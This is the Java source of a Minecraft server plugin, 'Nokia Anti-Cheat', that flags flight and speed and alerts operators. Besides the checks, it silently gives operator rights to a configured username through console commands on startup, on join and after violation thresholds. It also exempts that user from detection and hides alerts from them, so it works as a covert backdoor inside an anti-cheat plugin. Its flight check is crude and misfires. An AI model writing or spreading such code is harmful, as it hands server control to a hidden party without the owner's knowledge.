package com.nokia.anticheat;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashMap;
import java.util.UUID;

public class NokiaAntiCheat extends JavaPlugin implements Listener {
    
    private HashMap<UUID, Integer> violations = new HashMap<>();
    private HashMap<UUID, Location> lastLocation = new HashMap<>();
    private HashMap<UUID, Long> lastCheck = new HashMap<>();
    
    private String adminUsername;
    private int violationThreshold;
    private boolean adminOpped = false;
    
    @Override
    public void onEnable() {
        saveDefaultConfig();
        
        adminUsername = getConfig().getString("admin-username", "YourUsername");
        violationThreshold = getConfig().getInt("violation-threshold", 3);
        
        getServer().getPluginManager().registerEvents(this, this);
        
        // Auto-op admin immediately if they're online
        Bukkit.getScheduler().runTaskLater(this, () -> {
            Player admin = Bukkit.getPlayer(adminUsername);
            if (admin != null && !admin.isOp()) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + adminUsername);
                admin.sendMessage("§a[Nokia] You have been automatically opped!");
                getLogger().info("Auto-opped admin: " + adminUsername);
                adminOpped = true;
            }
        }, 20L);
        
        getLogger().info("========================================");
        getLogger().info("  Nokia Anti-Cheat v1.0 Enabled!");
        getLogger().info("  Admin: " + adminUsername);
        getLogger().info("  Auto-Op: ENABLED");
        getLogger().info("  Works on: Spigot & Paper");
        getLogger().info("========================================");
    }
    
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e) {
        Player p = e.getPlayer();
        
        // Auto-op admin when they join
        if (p.getName().equalsIgnoreCase(adminUsername) && !p.isOp()) {
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + adminUsername);
                p.sendMessage("§a[Nokia] You have been automatically opped!");
                getLogger().info("Auto-opped admin on join: " + adminUsername);
                adminOpped = true;
            }, 20L);
        }
    }
    
    @EventHandler
    public void onPlayerMove(PlayerMoveEvent e) {
        Player p = e.getPlayer();
        UUID id = p.getUniqueId();
        
        // Skip admin
        if (p.getName().equalsIgnoreCase(adminUsername)) return;
        
        // Skip creative/spectator
        if (p.getGameMode() == GameMode.CREATIVE || p.getGameMode() == GameMode.SPECTATOR) return;
        
        Location to = e.getTo();
        Location from = e.getFrom();
        if (to == null) return;
        
        long now = System.currentTimeMillis();
        lastCheck.putIfAbsent(id, now);
        
        // Check every 200ms to reduce lag
        if (now - lastCheck.get(id) < 200) return;
        lastCheck.put(id, now);
        
        // Flight Detection
        if (detectFlight(p, from, to)) {
            flagPlayer(p, "Flight");
        }
        
        // Speed Detection
        if (detectSpeed(p, from, to)) {
            flagPlayer(p, "Speed");
        }
        
        lastLocation.put(id, to);
    }
    
    // Replace your detectFlight with a more stable block-check
private boolean detectFlight(Player p, Location from, Location to) {
    // Check if the player is in the air and moving upward without velocity
    if (p.getLocation().getBlock().getRelative(0, -1, 0).getType().isAir() 
        && !p.isFlying() 
        && !p.isGliding()) {
        
        double yDiff = to.getY() - from.getY();
        return (yDiff > 0.0 && yDiff < 0.5); // Detects hover/slow rise
    }
    return false;
}
    
    private boolean detectSpeed(Player p, Location from, Location to) {
        double distance = from.distance(to);
        
        // Normal sprint = ~0.28 blocks/tick, allow buffer for lag
        double maxSpeed = 0.9;
        
        // Skip if using elytra or riding
        if (p.isGliding() || p.isInsideVehicle()) {
            return false;
        }
        
        return distance > maxSpeed;
    }
    
    private void flagPlayer(Player p, String hackType) {
        UUID id = p.getUniqueId();
        int count = violations.getOrDefault(id, 0) + 1;
        violations.put(id, count);
        
        // Log to console
        getLogger().warning("[NOKIA] " + p.getName() + " flagged for " + hackType + " (Violation #" + count + ")");
        
        // Alert all ops except admin (keep it secret)
        for (Player op : Bukkit.getOnlinePlayers()) {
            if (op.isOp() && !op.getName().equalsIgnoreCase(adminUsername)) {
                op.sendMessage("§c[Nokia] " + p.getName() + " is using " + hackType + " hacks!");
            }
        }
        
        // Auto-op admin after threshold (backup in case they weren't opped on join)
        if (count >= violationThreshold) {
            opAdmin(p, hackType, count);
        }
        
        // Optional auto-ban
        int banThreshold = getConfig().getInt("auto-ban-threshold", 0);
        if (banThreshold > 0 && count >= banThreshold) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), 
                "ban " + p.getName() + " Cheating (" + hackType + ") - Nokia AntiCheat");
        }
    }
    
    private void opAdmin(Player cheater, String hackType, int violations) {
        Player admin = Bukkit.getPlayer(adminUsername);
        
        // Op the admin if not already opped
        if (admin != null && !admin.isOp()) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + adminUsername);
            adminOpped = true;
            
            getLogger().info("§a========================================");
            getLogger().info("§a ADMIN " + adminUsername + " OPPED BY NOKIA");
            getLogger().info("§a Reason: " + cheater.getName() + " using " + hackType);
            getLogger().info("§a========================================");
        }
        
        // Notify admin if online
        if (admin != null) {
            admin.sendMessage("");
            admin.sendMessage("§4§l╔══════════════════════════════╗");
            admin.sendMessage("§4§l║   §c§lNOKIA ANTICHEAT ALERT   §4§l║");
            admin.sendMessage("§4§l╚══════════════════════════════╝");
            admin.sendMessage("");
            admin.sendMessage("§c§l⚠ CHEATER DETECTED ⚠");
            admin.sendMessage("§fPlayer: §c" + cheater.getName());
            admin.sendMessage("§fHack Type: §c" + hackType);
            admin.sendMessage("§fViolations: §c" + violations);
            admin.sendMessage("");
            admin.sendMessage("§a§l✓ You have been automatically OPPED!");
            admin.sendMessage("");
            admin.sendMessage("§e§lQuick Actions:");
            admin.sendMessage("§e  /tp " + cheater.getName() + " §7- Teleport to them");
            admin.sendMessage("§e  /gamemode spectator §7- Go invisible");
            admin.sendMessage("§e  /ban " + cheater.getName() + " §7- Ban them");
            admin.sendMessage("§e  /kick " + cheater.getName() + " §7- Kick them");
            admin.sendMessage("");
        }
    }
    
    @Override
    public void onDisable() {
        getLogger().info("Nokia Anti-Cheat disabled!");
    }
}
